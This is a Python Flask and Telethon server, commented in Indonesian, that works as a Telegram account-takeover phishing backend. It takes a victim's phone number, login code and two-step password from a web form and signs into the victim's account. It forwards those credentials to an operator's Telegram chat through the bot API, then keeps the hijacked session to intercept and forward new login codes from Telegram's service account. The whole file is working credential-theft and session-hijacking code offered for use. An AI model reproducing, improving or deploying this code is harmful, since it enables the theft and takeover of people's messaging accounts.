import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
RAILWAY_URL = f"https://{os.getenv('RAILWAY_STATIC_URL')}" # Otomatis ambil link railway

user_db = {}

def bot_api(method, payload):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        res = requests.post(url, json=payload)
        return res.json()
    except:
        return {}

# Fungsi otomatis daftar Webhook agar tombol OTP jalan
def set_webhook():
    if os.getenv('RAILWAY_STATIC_URL'):
        webhook_url = f"{RAILWAY_URL}/webhook"
        bot_api("setWebhook", {"url": webhook_url})

def normalisasi_nomor(nomor):
    num = re.sub(r'\D', '', nomor)
    if num.startswith('0'): num = '62' + num[1:]
    return '+' + num

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data: return jsonify({"status": "error"}), 400
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(handle_flow(data))
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step', 1))
        nomor = normalisasi_nomor(data.get('nomor', ''))
        nama = data.get('nama', 'User')
        
        if nomor not in user_db:
            user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}

        client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            res = await client.send_code_request(nomor)
            user_db[nomor]['hash'] = res.phone_code_hash
            user_db[nomor]['session'] = client.session.save()
            return jsonify({"status": "success"})

        elif step == 2:
            try:
                await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
                user_db[nomor]['session'] = client.session.save()
                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{data.get('otp')}`"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": text, 
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except errors.SessionPasswordNeededError:
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"})
            except: return jsonify({"status": "invalid_otp"}), 400

        elif step == 3:
            try:
                await client.sign_in(password=data.get('sandi'))
                user_db[nomor].update({"sandi": data.get('sandi'), "session": client.session.save()})
                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : Selesai"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": text, 
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except: return jsonify({"status": "invalid_2fa"}), 400
    finally:
        if client: await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if "callback_query" in update:
        call = update["callback_query"]
        action, nomor = call["data"].split("_")
        
        if action == "upd":
            # 1. Balasan teks seperti dulu
            msg_text = "Bot siap mengintip OTP!\nSilakan minta kode di TurboTel/Telegraph Anda."
            res = bot_api("sendMessage", {
                "chat_id": CHAT_ID, 
                "text": msg_text,
                "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
            })
            # Simpan ID pesan untuk tombol exit
            user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
            # 2. Jalankan fungsi mengintip (Sniffing)
            threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
            
        elif action == "exit":
            msg_id = user_db.get(nomor, {}).get('status_id')
            if msg_id:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": msg_id})

    return jsonify({"status": "success"})

async def monitor_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data['session']: return
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    try:
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                # 3. Kirim balik hasil intipan seperti dulu
                text_baru = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`"
                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text_baru, "parse_mode": "Markdown"})
                # Hapus pesan instruksi otomatis setelah dapet OTP
                if data.get('status_id'):
                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
        await asyncio.sleep(600)
    finally:
        await client.disconnect()

if __name__ == "__main__":
    set_webhook() # Daftarkan Webhook saat startup
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
